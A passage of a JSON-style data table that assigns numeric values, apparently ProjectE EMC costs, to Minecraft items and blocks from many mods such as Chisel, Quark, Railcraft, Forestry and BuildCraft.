  ""chisel:stonebrick2|6"": 1,
  ""chisel:stonebrick1|6"": 1,
  ""chisel:stonebrick2|5"": 1,
  ""chisel:stonebrick1|7"": 1,
  ""chisel:stonebrick2|4"": 1,
  ""chisel:stonebrick1|8"": 1,
  ""quark:color_slime|4"": 296,
  ""chisel:stonebrick1|9"": 1,
  ""chisel:stonebrick2|9"": 1,
  ""railcraft:sandy_brick_stairs|0"": 25,
  ""chisel:stonebrick2|8"": 1,
  ""quark:color_slime|0"": 304,
  ""quark:color_slime|1"": 1152,
  ""quark:color_slime|2"": 720,
  ""quark:color_slime|3"": 728,
  ""chisel:planks-acacia|14"": 8,
  ""chisel:planks-acacia|12"": 8,
  ""chisel:planks-acacia|13"": 8,
  ""chisel:planks-acacia|10"": 8,
  ""chisel:planks-acacia|11"": 8,
  ""chisel:planks-acacia|8"": 8,
  ""chisel:planks-acacia|9"": 8,
  ""chisel:planks-acacia|6"": 8,
  ""chisel:planks-acacia|7"": 8,
  ""chisel:planks-acacia|4"": 8,
  ""chisel:planks-acacia|5"": 8,
  ""chisel:planks-acacia|2"": 8,
  ""mocreatures:mossy_cobbled_wyvstone_stairs|0"": 1,
  ""chisel:planks-acacia|3"": 8,
  ""irontanks:obsidian_tank|0"": 22812,
  ""chisel:planks-acacia|0"": 8,
  ""chisel:planks-acacia|1"": 8,
  ""quark:paper_lantern|0"": 1736,
  ""quark:paper_lantern|1"": 1768,
  ""projectred-exploration:ruby_shovel|0"": 1032,
  ""minecraft:ender_chest|0"": 2304,
  ""blockcraftery:editable_pressure_plate_all_reinforced|0"": 41,
  ""minecraft:slime|0"": 288,
  ""extratrees:doors.beech|0"": 16,
  ""extratrees:stairs.apple|0"": 6,
  ""quark:icy_stone_wall|0"": 64,
  ""quark:iron_plate_stairs|0"": 66,
  ""quark:sandy_bricks_wall|0"": 65,
  ""minecraft:iron_chestplate|0"": 2048,
  ""minecraft:acacia_boat|0"": 40,
  ""minecraft:concrete|0"": 8,
  ""minecraft:concrete|1"": 4,
  ""minecraft:concrete|2"": 4,
  ""minecraft:concrete|3"": 4,
  ""minecraft:concrete|4"": 4,
  ""minecraft:nether_brick_fence|0"": 4,
  ""minecraft:concrete|5"": 6,
  ""minecraft:concrete|6"": 4,
  ""minecraft:concrete|7"": 6,
  ""minecraft:concrete|8"": 4,
  ""minecraft:concrete|9"": 57,
  ""minecraft:concrete|10"": 57,
  ""minecraft:concrete|11"": 110,
  ""minecraft:concrete|12"": 18,
  ""minecraft:concrete|13"": 3,
  ""minecraft:concrete|14"": 4,
  ""minecraft:concrete|15"": 4,
  ""galacticraftcore:cheese_curd|0"": 32,
  ""quark:stained_clay_tiles_silver_stairs|0"": 48,
  ""projectred-exploration:ruby_pickaxe|0"": 3080,
  ""minecraft:snow|0"": 1,
  ""extratrees:fence.gates.yew|0"": 32,
  ""forestry:sapling_ge|0"": 32,
  ""quark:stained_clay_tiles_brown_stairs|0"": 48,
  ""quark:midori_block_slab|0"": 4,
  ""chisel:glassdyedpurple|5"": 1,
  ""chisel:glassdyedpurple|4"": 1,
  ""extratrees:doors.fir|0"": 16,
  ""microblockcbe:saw_diamond|0"": 8206,
  ""chisel:glassdyedpurple|1"": 1,
  ""chisel:glassdyedpurple|0"": 1,
  ""minecraft:wooden_axe|0"": 32,
  ""chisel:glassdyedpurple|3"": 1,
  ""minecraft:activator_rail|0"": 268,
  ""chisel:glassdyedpurple|2"": 1,
  ""minecraft:dark_oak_boat|0"": 40,
  ""extratrees:doors.fig|0"": 16,
  ""railcraft:badlands|4"": 58,
  ""irontanks:copper_tank|0"": 268,
  ""railcraft:badlands|5"": 34,
  ""railcraft:badlands|2"": 34,
  ""railcraft:badlands|3"": 34,
  ""railcraft:badlands|0"": 34,
  ""railcraft:badlands|1"": 34,
  ""quark:elder_prismarine_bricks_slab|0"": 144,
  ""minecraft:baked_potato|0"": 64,
  ""binniecore:field_kit|63"": 560,
  ""chiselsandbits:bitsaw_diamond|0"": 16400,
  ""quark:colored_flowerpot_purple|0"": 488,
  ""minecraft:stone_hoe|0"": 10,
  ""minecraft:bread|0"": 72,
  ""quark:iron_plate_slab|0"": 44,
  ""minecraft:carrot|0"": 64,
  ""forestry:fence.gates.greenheart|0"": 32,
  ""railcraft:frostbound_slab|1"": 56,
  ""extratrees:stairs.elder|0"": 6,
  ""railcraft:frostbound_slab|0"": 56,
  ""chisel:glassdyedgray|1"": 1,
  ""chisel:glassdyedgray|0"": 1,
  ""chisel:glassdyedgray|3"": 1,
  ""chisel:glassdyedgray|2"": 1,
  ""minecraft:diamond_horse_armor|0"": 49200,
  ""buildcrafttransport:pipe_quartz_item|16"": 256,
  ""chisel:glassdyedgray|5"": 1,
  ""chisel:glassdyedgray|4"": 1,
  ""minecraft:cobblestone|0"": 1,
  ""buildcrafttransport:pipe_quartz_item|3"": 256,
  ""ironchest:copper_iron_chest_upgrade|0"": 1156,
  ""buildcrafttransport:pipe_quartz_item|2"": 256,
  ""buildcrafttransport:pipe_quartz_item|1"": 256,
  ""buildcrafttransport:pipe_quartz_item|7"": 256,
  ""buildcrafttransport:pipe_quartz_item|6"": 256,
  ""buildcrafttransport:pipe_quartz_item|5"": 256,
  ""quark:stained_clay_tiles_cyan_slab|0"": 32,
  ""buildcrafttransport:pipe_quartz_item|4"": 256,
  ""buildcrafttransport:pipe_quartz_item|11"": 256,
  ""buildcrafttransport:pipe_quartz_item|10"": 256,
  ""buildcrafttransport:pipe_quartz_item|9"": 256,
  ""buildcrafttransport:pipe_quartz_item|8"": 256,
  ""buildcrafttransport:pipe_quartz_item|15"": 256,
  ""buildcrafttransport:pipe_quartz_item|14"": 256,
  ""buildcrafttransport:pipe_quartz_item|13"": 256,
  ""buildcrafttransport:pipe_quartz_item|12"": 256,
  ""forestry:stairs.chestnut|0"": 6,
  ""botany:trowel_iron|0"": 261,
  ""quark:bark_acacia_wall|0"": 32,
  ""quark:reed_block_stairs|0"": 216,
  ""forestry:stairs.palm|0"": 6,
  ""galacticraftplanets:mars_stairs_cobblestone|0"": 3,
  ""minecraft:acacia_fence_gate|0"": 32,
  ""quark:fire_stone_brick_stairs|0"": 48,
  ""cathedral:cathedral_gargoyle_demon_marble|0"": 265,
  ""extratrees:stairs.elm|0"": 6,
  ""forestry:fence.gates.chestnut|0"": 32,
  ""mocreatures:fine_silver_ingot|0"": 512,
  ""mocreatures:cobbled_deep_wyvstone_wall|0"": 1,
  ""minecraft:stone|1"": 16,
  ""minecraft:stone|0"": 1,
  ""minecraft:stone|3"": 16,
  ""minecraft:stone|2"": 16,
  ""minecraft:stone|5"": 16,
  ""minecraft:stone|4"": 16,
  ""minecraft:stone|6"": 16,
  ""extratrees:stairs.olive|0"": 6,
  ""minecraft:leather_leggings|0"": 448,
  ""quark:bark_birch_stairs|0"": 24,
  ""quark:cobblestone_mossy_slab|0"": 4,
  ""minecraft:sea_lantern|0"": 3584,
  ""minecraft:ghast_tear|0"": 4096,
  ""extratrees:fence.gates.rosewood|0"": 32,
  ""chisel:valentines|0"": 6,
  ""quark:biome_cobblestone|1"": 64,
  ""quark:biome_cobblestone|0"": 64,
  ""quark:biome_cobblestone|2"": 16,
  ""minecraft:crafting_table|0"": 32,
  ""quark:colored_flowerpot_blue|0"": 912,
  ""minecraft:blaze_powder|0"": 768,
  ""blockcraftery:editable_door|0"": 16,
  ""forestry:fence.gates.palm|0"": 32,
  ""forestry:fence.gates.papaya|0"": 32,
  ""quark:stained_clay_tiles_brown_slab|0"": 32,
  ""forestry:stairs.greenheart|0"": 6,
  ""blockcraftery:editable_pressure_plate_mobs_reinforced|0"": 41,
  ""mocreatures:deep_wyvstone_button|0"": 2,
  ""mocreatures:wyvwood_leaves|0"": 1,
  ""forestry:doors.maple|0"": 16,
  ""blockcraftery:editable_pressure_plate_all|0"": 16,
  ""quark:stained_planks_lime_stairs|0"": 6,
  ""minecraft:magma_cream|0"": 800,
  ""forestry:doors.poplar|0"": 16,
  ""quark:grate|0"": 192,
  ""quark:stone_diorite_stairs|0"": 12,
  ""buildcrafttransport:pipe_gold_item|16"": 512,
  ""chisel:glassdyedgreen|2"": 1,
  ""buildcrafttransport:pipe_gold_item|13"": 512,
  ""chisel:glassdyedgreen|3"": 1,
  ""buildcrafttransport:pipe_gold_item|12"": 512,
  ""chisel:glassdyedgreen|0"": 1,
  ""buildcrafttransport:pipe_gold_item|15"": 512,
  ""chisel:glassdyedgreen|1"": 1,
  ""buildcrafttransport:pipe_gold_item|14"": 512,
  ""buildcrafttransport:pipe_gold_item|9"": 512,
  ""buildcrafttransport:pipe_gold_item|8"": 512,
  ""chisel:glassdyedgreen|4"": 1,
  ""buildcrafttransport:pipe_gold_item|11"": 512,
  ""chisel:glassdyedgreen|5"": 1,
  ""buildcrafttransport:pipe_gold_item|10"": 512,
  ""buildcrafttransport:pipe_gold_item|5"": 512,
  ""buildcrafttransport:pipe_gold_item|4"": 512,
  ""buildcrafttransport:pipe_gold_item|7"": 512,
  ""buildcrafttransport:pipe_gold_item|6"": 512,
  ""minecraft:leaves|0"": 1,
  ""buildcrafttransport:pipe_gold_item|1"": 512,
  ""minecraft:leaves|1"": 1,
  ""minecraft:leaves|2"": 1,
  ""buildcrafttransport:pipe_gold_item|3"": 512,
  ""minecraft:leaves|3"": 1,
  ""buildcrafttransport:pipe_gold_item|2"": 512,
  ""minecraft:prismarine_crystals|0"": 512,
  ""chisel:glassdyedblack|5"": 1,
  ""chisel:glassdyedblack|4"": 1,
  ""chisel:glassdyedblack|3"": 1,
  ""chisel:glassdyedblack|2"": 1,
  ""chisel:glassdyedblack|1"": 1,
  ""chisel:glassdyedblack|0"": 1,
  ""minecraft:furnace|0"": 8,
  ""forestry:stairs.teak|0"": 6,
  ""quark:bark_oak_wall|0"": 32,
  ""chisel:chisel_diamond|0"": 8196,
  ""minecraft:jungle_stairs|0"": 6,
  ""minecraft:rail|0"": 96,
  ""quark:stone_diorite_slab|0"": 8,
  ""minecraft:purple_shulker_box|0"": 4160,
  ""railcraft:generic|8"": 32,
  ""forestry:fence.gates.pine|0"": 32,
  ""quark:stained_clay_tiles_pink_slab|0"": 32,
  ""quark:spruce_button|0"": 8,
  ""chisel:glass1|1"": 1,
  ""chisel:glass1|0"": 1,
  ""railcraft:abyssal_paver_stairs|0"": 24,
  ""quark:roots|0"": 8,
  ""minecraft:web|0"": 12,
  ""quark:bark_jungle_wall|0"": 32,
  ""railcraft:frostbound_paver_stairs|0"": 84,
  ""minecraft:painting|0"": 80,
  ""quark:bark|3"": 32,
  ""quark:bark|2"": 32,
  ""quark:bark|1"": 32,
  ""quark:bark|0"": 32,
  ""quark:stained_clay_tiles_lime_slab|0"": 32,
  ""quark:bark|5"": 32,
  ""ironchest:copper_silver_shulker_upgrade|0"": 4224,
  ""quark:bark|4"": 32,
  ""minecraft:dispenser|0"": 119,
  ""buildcrafttransport:pipe_stone_power|8"": 64,
  ""buildcrafttransport:pipe_stone_power|9"": 64,
  ""buildcrafttransport:pipe_stone_power|10"": 64,
  ""buildcrafttransport:pipe_stone_power|11"": 64,
  ""buildcrafttransport:pipe_stone_power|12"": 64,
  ""buildcrafttransport:pipe_stone_power|13"": 64,
  ""minecraft:leather_boots|0"": 256,
  ""buildcrafttransport:pipe_stone_power|14"": 64,
  ""buildcrafttransport:pipe_stone_power|15"": 64,
  ""buildcrafttransport:pipe_stone_power|1"": 64,
  ""minecraft:beetroot_soup|0"": 390,
  ""buildcrafttransport:pipe_stone_power|2"": 64,
  ""ironchest:iron_gold_chest_upgrade|0"": 16640,
  ""buildcrafttransport:pipe_stone_power|3"": 64,
  ""buildcrafttransport:pipe_stone_power|4"": 64,
  ""buildcrafttransport:pipe_stone_power|5"": 64,
  ""buildcrafttransport:pipe_stone_power|6"": 64,
  ""buildcrafttransport:pipe_stone_power|7"": 64,
  ""minecraft:redstone_block|0"": 576,
  ""buildcrafttransport:pipe_stone_power|16"": 64,
  ""railcraft:badlands_brick_stairs|0"": 25,
  ""forestry:fence.gates.teak|0"": 32,
  ""quark:thatch|0"": 96,
  ""minecraft:sponge|1"": 128,
  ""minecraft:sponge|0"": 128,
  ""extratrees:stairs.hemlock|0"": 6,
  ""quark:stained_clay_tiles_orange_stairs|0"": 48,
  ""quark:stained_planks_magenta_stairs|0"": 6,
  ""minecraft:fermented_spider_eye|0"": 192,
  ""extratrees:stairs.logwood|0"": 6,
  ""extratrees:doors.brazilwood|0"": 16,
  ""irontanks:glass_copper_upgrade|0"": 513,
  ""minecraft:rabbit_hide|0"": 16,
  ""mocreatures:cobbled_wyvstone|0"": 1,
  ""quark:stone_granite_wall|0"": 16,
  ""forestry:stairs.poplar|0"": 6,
  ""quark:stained_clay_tiles_red_stairs|0"": 48,
  ""quark:charred_nether_brick_stairs|0"": 85,
  ""buildcrafttransport:pipe_cobble_power|16"": 64,
  ""quark:stained_planks_blue_stairs|0"": 6,
  ""buildcrafttransport:pipe_cobble_power|2"": 64,
  ""buildcrafttransport:pipe_cobble_power|3"": 64,
  ""buildcrafttransport:pipe_cobble_power|1"": 64,
  ""buildcrafttransport:pipe_cobble_power|6"": 64,
  ""buildcrafttransport:pipe_cobble_power|7"": 64,
  ""buildcrafttransport:pipe_cobble_power|4"": 64,
  ""buildcrafttransport:pipe_cobble_power|5"": 64,
  ""buildcrafttransport:pipe_cobble_power|10"": 64,
  ""buildcrafttransport:pipe_cobble_power|11"": 64,
  ""buildcrafttransport:pipe_cobble_power|8"": 64,
  ""buildcrafttransport:pipe_cobble_power|9"": 64,
  ""buildcrafttransport:pipe_cobble_power|14"": 64,
  ""buildcrafttransport:pipe_cobble_power|15"": 64,
  ""buildcrafttransport:pipe_cobble_power|12"": 64,
  ""buildcrafttransport:pipe_cobble_power|13"": 64,
  ""minecraft:carrot_on_a_stick|0"": 100,
  ""minecraft:wheat|0"": 24,
  ""quark:stained_clay_tiles_yellow_stairs|0"": 48,
  ""quark:bark_dark_oak_slab|0"": 16,
  ""blockcraftery:editable_stairs_reinforced|0"": 24,
  ""galacticraftplanets:venus|0"": 8,
  ""galacticraftplanets:venus|1"": 8,
  ""galacticraftplanets:venus|2"": 64,
  ""galacticraftplanets:venus|3"": 16,
  ""minecraft:brown_glazed_terracotta|0"": 64,
  ""extratrees:doors.sweetgum|0"": 16,
  ""quark:cobbed_stone_stairs|0"": 12,
  ""minecraft:acacia_stairs|0"": 6,
  ""ironchest:diamond_obsidian_shulker_upgrade|0"": 513,
  ""quark:stone_granite_bricks_wall|0"": 16,
  ""minecraft:glass_bottle|0"": 1,
  ""railcraft:bleachedbone_paver_stairs|0"": 162,
  ""cathedral:claytile|0"": 3,
  ""extratrees:fence.gates.whitebeam|0"": 32,
  ""minecraft:diamond_shovel|0"": 8200,
  ""quark:elder_prismarine_dark_wall|0"": 1040,
  ""mocreatures:wyvdirt|0"": 1,
  ""minecraft:magenta_glazed_terracotta|0"": 64,
  ""minecraft:stone_button|0"": 1,
  ""minecraft:birch_boat|0"": 40,
  ""chisel:glassdyedorange|4"": 1,
  ""chisel:glassdyedorange|5"": 1,
  ""chisel:glassdyedorange|0"": 1,
  ""chisel:glassdyedorange|1"": 1,
  ""chisel:glassdyedorange|2"": 1,
  ""chisel:glassdyedorange|3"": 1,
  ""minecraft:detector_rail|0"": 267,
  ""quark:cobbed_stone_slab|0"": 8,
  ""minecraft:pink_glazed_terracotta|0"": 64,
  ""minecraft:hopper|0"": 1344,
  ""quark:sandy_bricks|0"": 65,
  ""minecraft:green_glazed_terracotta|0"": 64,
  ""quark:stained_clay_tiles_blue_slab|0"": 32,
  ""minecraft:chorus_plant|0"": 64,
  ""minecraft:flint_and_steel|0"": 260,
  ""quark:soul_sandstone_bricks_stairs|0"": 147,
  ""minecraft:glowstone_dust|0"": 384,
  ""projecte:nova_cataclysm|0"": 4849,
  ""mocreatures:wyvwood_fence_gate|0"": 32,
  ""buildcrafttransport:pipe_void_item|16"": 10,
  ""buildcrafttransport:pipe_void_item|8"": 10,
  ""buildcrafttransport:pipe_void_item|9"": 10,
  ""buildcrafttransport:pipe_void_item|10"": 10,
  ""buildcrafttransport:pipe_void_item|11"": 10,
  ""buildcrafttransport:pipe_void_item|12"": 10,
  ""buildcrafttransport:pipe_void_item|13"": 10,
  ""buildcrafttransport:pipe_void_item|14"": 10,
  ""buildcrafttransport:pipe_void_item|15"": 10,
  ""buildcrafttransport:pipe_void_item|1"": 10,
  ""buildcrafttransport:pipe_void_item|2"": 10,
  ""buildcrafttransport:pipe_void_item|3"": 10,
  ""buildcrafttransport:pipe_void_item|4"": 10,
  ""buildcrafttransport:pipe_void_item|5"": 10,
  ""buildcrafttransport:pipe_void_item|6"": 10,
  ""buildcrafttransport:pipe_void_item|7"": 10,
  ""quark:colored_flowerpot_orange|0"": 64,
  ""minecraft:lime_glazed_terracotta|0"": 64,
  ""quark:tallow|0"": 64,
  ""projectred-exploration:ruby_sickle|0"": 3076,
  ""mocreatures:mossy_cobbled_deep_wyvstone_slab|0"": 1,
  ""extratrees:fence.gates.pinkivory|0"": 32,
  ""ironchest:wood_iron_chest_upgrade|0"": 2056,
  ""quark:stained_planks_purple_slab|0"": 4,
  ""minecraft:clock|0"": 8256,
  ""quark:stained_planks_pink_stairs|0"": 6,
  ""blockcraftery:editable_slab_reinforced|0"": 33,
  ""railcraft:badlands_slab|1"": 17,
  ""railcraft:badlands_slab|0"": 17,
  ""forestry:fence.gates.giganteum|0"": 32,
  ""blockcraftery:editable_fence|0"": 6,
  ""quark:crab_leg|0"": 64,
  ""minecraft:golden_helmet|0"": 10240,
  ""minecraft:spectral_arrow|0"": 775,
  ""quark:iron_rod|0"": 944,
  ""forestry:stairs.ebony|0"": 6,
  ""minecraft:emerald_block|0"": 147456,
  ""chisel:bookshelf_jungle|0"": 504,
  ""railcraft:sandy|4"": 58,
  ""railcraft:sandy|5"": 34,
  ""quark:colored_flowerpot_cyan|0"": 484,
  ""railcraft:sandy|2"": 34,
  ""quark:bark_spruce_slab|0"": 16,
  ""railcraft:sandy|3"": 34,
  ""railcraft:sandy|0"": 34,
  ""railcraft:sandy|1"": 34,
  ""quark:variant_sapling|1"": 32,
  ""quark:variant_sapling|0"": 32,
  ""railcraft:bleachedbone_slab|0"": 108,
  ""railcraft:bleachedbone_slab|1"": 108,
  ""quark:stone_diorite_bricks_wall|0"": 16,
  ""extratrees:fence.gates.beech|0"": 32,
  ""railcraft:bloodstained|5"": 36,
  ""railcraft:bloodstained|4"": 60,
  ""railcraft:bloodstained|3"": 36,
  ""railcraft:bloodstained|2"": 36,
  ""railcraft:bloodstained|1"": 36,
  ""railcraft:bloodstained|0"": 36,
  ""minecraft:golden_horse_armor|0"": 12336,
  ""quark:andesite_speleothem|0"": 8,
  ""mocreatures:tall_wyvgrass|0"": 1,
  ""railcraft:abyssal_stone|0"": 32,
  ""ichunutil:compact_porkchop|0"": 576,
  ""mocreatures:mossy_cobbled_deep_wyvstone_stairs|0"": 1,
  ""quark:colored_flowerpot_magenta|0"": 64,
  ""extratrees:stairs.whitebeam|0"": 6,
  ""forestry:fences.0|8"": 13,
  ""forestry:fences.1|9"": 13,
  ""quark:stained_clay_tiles_lime_stairs|0"": 48,
  ""forestry:fences.0|9"": 13,
  ""forestry:fences.1|8"": 13,
  ""forestry:fences.0|10"": 13,
  ""forestry:fences.1|11"": 13,
  ""forestry:fences.0|11"": 13,
  ""forestry:fences.1|10"": 13,
  ""forestry:fences.0|12"": 13,
  ""forestry:fences.0|13"": 13,
  ""forestry:fences.1|12"": 13,
  ""forestry:fences.0|14"": 13,
  ""forestry:fences.0|15"": 13,
  ""forestry:fences.0|0"": 13,
  ""forestry:fences.1|1"": 13,
  ""forestry:fences.0|1"": 13,
  ""forestry:fences.1|0"": 13,
  ""forestry:fences.0|2"": 13,
  ""forestry:fences.1|3"": 13,
  ""forestry:fences.0|3"": 13,
  ""forestry:fences.1|2"": 13,
  ""forestry:fences.0|4"": 13,
  ""forestry:fences.1|5"": 13,
  ""forestry:fences.0|5"": 13,
  ""forestry:fences.1|4"": 13,
  ""forestry:fences.0|6"": 13,
  ""forestry:fences.1|7"": 13,
  ""forestry:fences.0|7"": 13,
  ""forestry:fences.1|6"": 13,
  ""quark:nether_brick_fence_gate|0"": 12,
  ""forestry:stairs.giganteum|0"": 6,
  ""forestry:stairs.wenge|0"": 6,
  ""buildcrafttransport:pipe_emzuli_item|16"": 11872,
  ""quark:paper_wall|0"": 20,
  ""projectred-exploration:diamond_sickle|0"": 24580,
  ""forestry:fence.gates.baobab|0"": 32,
  ""minecraft:pumpkin_seeds|0"": 36,
  ""quark:sugar_block|0"": 288,
  ""buildcrafttransport:pipe_emzuli_item|1"": 11872,
  ""buildcrafttransport:pipe_emzuli_item|2"": 11872,
  ""buildcrafttransport:pipe_emzuli_item|3"": 11872,
  ""extratrees:doors.cypress|0"": 16,
  ""buildcrafttransport:pipe_emzuli_item|4"": 11872,
  ""buildcrafttransport:pipe_emzuli_item|5"": 11872,
  ""forestry:doors.plum|0"": 16,
  ""buildcrafttransport:pipe_emzuli_item|6"": 11872,
  ""buildcrafttransport:pipe_emzuli_item|7"": 11872,
  ""buildcrafttransport:pipe_emzuli_item|8"": 11872,
  ""buildcrafttransport:pipe_emzuli_item|9"": 11872,
  ""quark:stained_planks_silver_stairs|0"": 6,
  ""buildcrafttransport:pipe_emzuli_item|10"": 11872,
  ""buildcrafttransport:pipe_emzuli_item|11"": 11872,
  ""buildcrafttransport:pipe_emzuli_item|12"": 11872,
  ""buildcrafttransport:pipe_emzuli_item|13"": 11872,
  ""buildcrafttransport:pipe_emzuli_item|14"": 11872,
  ""buildcrafttransport:pipe_emzuli_item|15"": 11872,
  ""minecraft:tnt|0"": 964,
  ""quark:bark_acacia_stairs|0"": 24,
  ""cathedral:cathedral_gargoyle_demon_sandstone|0"": 265,
  ""minecraft:arrow|0"": 14,
  ""projecte:condenser_mk1|0"": 42011,
  ""projecte:condenser_mk2|0"": 9741339,
  ""chisel:factory|0"": 32,
  ""minecraft:iron_axe|0"": 776,
  ""quark:rope|0"": 48,
  ""railcraft:badlands_paver_stairs|0"": 25,
  ""extratrees:doors.syzgium|0"": 16,
  ""forestry:fence.gates.acacia|0"": 32,
  ""minecraft:stained_glass|2"": 1,
  ""minecraft:stained_glass|3"": 1,
  ""minecraft:stained_glass|0"": 1,
  ""minecraft:stained_glass|1"": 1,
  ""minecraft:stained_glass|6"": 1,
  ""minecraft:stained_glass|7"": 1,
  ""minecraft:stained_glass|4"": 1,
  ""minecraft:stained_glass|5"": 1,
  ""minecraft:stained_glass|10"": 1,
  ""minecraft:stained_glass|11"": 1,
  ""minecraft:stained_glass|8"": 1,
  ""minecraft:stained_glass|9"": 1,
  ""minecraft:stained_glass|14"": 1,
  ""minecraft:stained_glass|15"": 1,
  ""minecraft:stained_glass|12"": 1,
  ""extratrees:stairs.butternut|0"": 6,
  ""minecraft:stained_glass|13"": 1,
  ""forestry:slabs.2|4"": 4,
  ""forestry:slabs.0|6"": 4,
  ""forestry:slabs.1|5"": 4,
  ""forestry:slabs.0|7"": 4,
  ""forestry:slabs.2|5"": 4,
  ""forestry:slabs.1|4"": 4,
  ""forestry:slabs.2|6"": 4,
  ""forestry:slabs.0|4"": 4,
  ""forestry:slabs.1|7"": 4,
  ""forestry:slabs.0|5"": 4,
  ""forestry:slabs.2|7"": 4,
  ""forestry:slabs.1|6"": 4,
  ""minecraft:armor_stand|0"": 24,
  ""forestry:slabs.2|0"": 4,
  ""forestry:slabs.0|2"": 4,
  ""forestry:slabs.1|1"": 4,
  ""forestry:slabs.0|3"": 4,
  ""forestry:slabs.2|1"": 4,
  ""forestry:slabs.1|0"": 4,
  ""forestry:slabs.2|2"": 4,
  ""forestry:slabs.0|0"": 4,
  ""forestry:slabs.1|3"": 4,
  ""forestry:slabs.0|1"": 4,
  ""forestry:slabs.2|3"": 4,
  ""forestry:slabs.1|2"": 4,
  ""forestry:slabs.3|3"": 4,
  ""forestry:slabs.3|2"": 4,
  ""quark:icy_stone_brick_wall|0"": 64,
  ""forestry:slabs.3|1"": 4,
  ""forestry:slabs.3|0"": 4,
  ""forestry:slabs.3|4"": 4,
  ""buildcrafttransport:pipe_obsidian_item|11"": 16,
  ""buildcrafttransport:pipe_obsidian_item|10"": 16,
  ""buildcrafttransport:pipe_obsidian_item|9"": 16,
  ""buildcrafttransport:pipe_obsidian_item|8"": 16,
  ""buildcrafttransport:pipe_obsidian_item|15"": 16,
  ""buildcrafttransport:pipe_obsidian_item|14"": 16,
  ""extratrees:doors.hornbeam|0"": 16,
  ""buildcrafttransport:pipe_obsidian_item|13"": 16,
  ""buildcrafttransport:pipe_obsidian_item|12"": 16,
  ""buildcrafttransport:pipe_obsidian_item|3"": 16,
  ""buildcrafttransport:pipe_obsidian_item|2"": 16,
  ""buildcrafttransport:pipe_obsidian_item|1"": 16,
  ""buildcrafttransport:pipe_obsidian_item|7"": 16,
  ""buildcrafttransport:pipe_obsidian_item|6"": 16,
  ""buildcrafttransport:pipe_obsidian_item|5"": 16,
  ""buildcrafttransport:pipe_obsidian_item|4"": 16,
  ""projecte:relay_mk1|0"": 74177,
  ""minecraft:chicken|0"": 64,
  ""buildcrafttransport:pipe_obsidian_item|16"": 16,
  ""projecte:relay_mk3|0"": 681281,
  ""projecte:relay_mk2|0"": 213889,
  ""minecraft:diamond_hoe|0"": 16392,
  ""extratrees:fence.gates.pear|0"": 32,
  ""forestry:can|0"": 64,
  ""extratrees:stairs.syzgium|0"": 6,
  ""quark:turf_slab|0"": 2,
  ""ironchest:gold_diamond_chest_upgrade|0"": 18438,
  ""extratrees:fence.gates.cypress|0"": 32,
  ""minecraft:item_frame|0"": 96,
  ""minecraft:minecart|0"": 1280,
  ""forestry:doors.acacia|0"": 16,
  ""quark:hardened_clay_tiles_stairs|0"": 48,
  ""minecraft:iron_block|0"": 2304,
  ""extratrees:fence.gates.sweetgum|0"": 32,
  ""chisel:offsettool|0"": 1540,
  ""forestry:doors.padauk|0"": 16,
  ""quark:stained_clay_tiles|4"": 64,
  ""quark:stained_clay_tiles|5"": 64,
  ""quark:stained_clay_tiles|6"": 64,
  ""quark:stained_clay_tiles|7"": 64,
  ""quark:stained_clay_tiles|0"": 64,
  ""quark:stained_clay_tiles|1"": 64,
  ""quark:stained_clay_tiles|2"": 64,
  ""quark:stained_clay_tiles|3"": 64,
  ""quark:stained_clay_tiles|12"": 64,
  ""quark:stained_clay_tiles|13"": 64,
  ""quark:stained_clay_tiles|14"": 64,
  ""forestry:fence.gates.plum|0"": 32,
  ""quark:stained_clay_tiles|15"": 64,
  ""quark:stained_clay_tiles|8"": 64,
  ""quark:stained_clay_tiles|9"": 64,
  ""quark:stained_clay_tiles|10"": 64,
  ""quark:stained_clay_tiles|11"": 64,
  ""quark:bark_acacia_slab|0"": 16,
  ""minecraft:dark_oak_stairs|0"": 6,
  ""minecraft:rotten_flesh|0"": 32,
  ""extratrees:fence.gates.syzgium|0"": 32,
  ""quark:stained_clay_tiles_blue_stairs|0"": 48,
  ""minecraft:acacia_door|0"": 16,
  ""minecraft:flower_pot|0"": 48,
  ""quark:trowel|0"": 516,
  ""quark:stone_andesite_wall|0"": 16,
  ""minecraft:furnace_minecart|0"": 1288,
  ""blockcraftery:editable_pressure_plate_mobs|0"": 16,
  ""quark:hardened_clay_tiles_slab|0"": 32,
  ""cathedral:deckprism|11"": 1,
  ""railcraft:glass|3"": 57,
  ""cathedral:deckprism|10"": 1,
  ""railcraft:glass|2"": 57,
  ""cathedral:deckprism|9"": 1,
  ""railcraft:glass|1"": 57,
  ""cathedral:deckprism|8"": 1,
  ""railcraft:glass|0"": 55,
  ""cathedral:deckprism|15"": 1,
  ""railcraft:glass|7"": 59,
  ""cathedral:deckprism|14"": 1,
  ""railcraft:glass|6"": 57,
  ""cathedral:deckprism|13"": 1,
  ""railcraft:glass|5"": 58,
  ""cathedral:deckprism|12"": 1,
  ""railcraft:glass|4"": 57,
  ""cathedral:deckprism|3"": 1,
  ""railcraft:glass|11"": 163,
  ""cathedral:deckprism|2"": 1,
  ""railcraft:glass|10"": 110,
  ""cathedral:deckprism|1"": 1,
  ""railcraft:glass|9"": 109,
  ""cathedral:deckprism|0"": 1,
  ""railcraft:glass|8"": 57,
  ""cathedral:deckprism|7"": 1,
  ""quark:sandstone_bricks_stairs|0"": 3,
  ""railcraft:glass|15"": 57,
  ""cathedral:deckprism|6"": 1,
  ""railcraft:glass|14"": 57,
  ""cathedral:deckprism|5"": 1,
  ""railcraft:glass|13"": 56,
  ""cathedral:deckprism|4"": 1,
  ""railcraft:glass|12"": 71,
  ""mocreatures:wyvwood_slab|0"": 4,
  ""quark:elder_prismarine_bricks_wall|0"": 288,
  ""forestry:fence.gates.ipe|0"": 32,
  ""minecraft:spider_eye|0"": 128,
  ""quark:stained_planks_red_slab|0"": 4,
  ""projecte:collector_mk3|0"": 710665,
  ""projecte:collector_mk2|0"": 232969,
  ""projecte:collector_mk1|0"": 82953,
  ""minecraft:stained_hardened_clay|7"": 64,
  ""minecraft:stained_hardened_clay|6"": 64,
  ""minecraft:stained_hardened_clay|5"": 64,
  ""minecraft:stained_hardened_clay|4"": 64,
  ""minecraft:stained_hardened_clay|3"": 64,
  ""minecraft:stained_hardened_clay|2"": 64,
  ""minecraft:stained_hardened_clay|1"": 64,
  ""minecraft:stained_hardened_clay|0"": 64,
  ""minecraft:stained_hardened_clay|15"": 64,
  ""minecraft:stained_hardened_clay|14"": 64,
  ""minecraft:stained_hardened_clay|13"": 64,
  ""extratrees:fence.gates.fig|0"": 32,
  ""minecraft:stained_hardened_clay|12"": 64,
  ""minecraft:stained_hardened_clay|11"": 64,
